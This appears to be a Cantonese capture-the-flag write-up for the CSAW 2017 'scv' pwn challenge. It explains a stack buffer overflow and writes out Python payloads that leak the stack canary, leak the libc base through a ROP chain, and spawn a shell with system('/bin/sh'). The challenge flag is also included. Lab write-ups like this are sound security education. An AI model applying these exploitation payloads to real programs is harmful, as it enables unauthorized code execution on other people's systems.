# CSAW 2017 pwn 100 scv

# 題目:


>                                         SCV
>            SCV is too hungry to mine the minerals. Can you give him some food?
>                                 nc pwn.chal.csaw.io 3764

>[scv](scv)

>[ibc-2.23.so](ibc-2.23.so)


呢題有少少煩,不過唔難

Checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
IO dump:

```
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>

```

有3個function:

1.入buffer

2.print buffer

3.exit


Ida code (由於好多廢話,所以淨係留重點)

```C++
                .
                .
 char buf; // [sp+10h] [bp-B0h]@6
                .
                .

   v23 = read(0, &buf, 248uLL);             .

```

有用嘅其實只有一/兩句,其他都係廢話

呢兩句identify 左有buffer overflow, buffer只有176 byte,但係可以讀248,仲唔死

asm code:

```asm
.text:0000000000400A96 buf             = byte ptr -0B0h
.text:0000000000400A96 var_8           = qword ptr -8
.text:0000000000400A96
.text:0000000000400A96                 push    rbp
.text:0000000000400A97                 mov     rbp, rsp
.text:0000000000400A9A                 sub     rsp, 0C0h
.text:0000000000400AA1                 mov     rax, fs:28h
.text:0000000000400AAA                 mov     [rbp+var_8], rax
.text:0000000000400AAE                 xor     eax, eax
.text:0000000000400AB0                 mov     rax, cs:stdout

```

我地知道canary 係rbp-8, 只要leak到canary,就可以任意寫return address, get shell

經過少少測試之後,會發現print buffer function會print多左8個位 or until \x00

我地知道嘅尾數係\x00, 所以我地只要寫到尾數做其他野就leak到canary

leak canary payload= payload='b'*167+'a'+'g'

只要將leak到嘅canary減0x67(g),就等於canary number

下一步就係leak libc address..

係之前d測試,除左發現會print多左8個位之外,我仲發現只要寫爛左canary,一禁exit 就可以stack check fail,姐係代表我地可以用exit return去其他return address,只要我地拎到canary, return address 就任我地寫

由於有nx,所以只可以rop + return to libc解決

由於係x64,x64有calling convention,puts係讀rdi嘅parameters,所以就一個pop_rdi_ret gadget mov puts or whatever got 入去,俾puts_plt print

Print 完再彈返去main

full gadget= pop_rdi_ret+PUTSGOT+PUTSPLT+main

```python

payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(PUTSGOT)+p64(PUTSPLT)+p64(main)

```


呢到要注意一樣野,main係要跳返去initial variable個部份,不過因為個process冇熄過,所以canary同libcbase係唔會改

拎晒libc_base 之後,加返d offset,係入buffer個個位入:

```python

payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(libc_bin_sh)+p64(system)+p64(main)

```

禁exit 就會彈shell 

```
flag: flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}

```
